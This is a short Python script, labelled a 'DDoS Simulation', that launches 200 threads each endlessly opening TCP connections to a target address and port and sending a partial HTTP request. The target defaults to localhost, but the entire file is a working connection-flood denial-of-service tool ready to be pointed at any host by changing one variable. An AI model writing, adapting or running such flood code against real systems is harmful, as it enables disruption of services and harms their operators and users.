import socket
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"GET / HTTP/1.1\r\n")
            s.close()
        except Exception as e:
            print(f"Error: {e}")
            pass


def start_ddos(threads=200):

    print("[+] Starting DDoS Simulation")

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

    while True:
        pass


if __name__ == "__main__":
    start_ddos()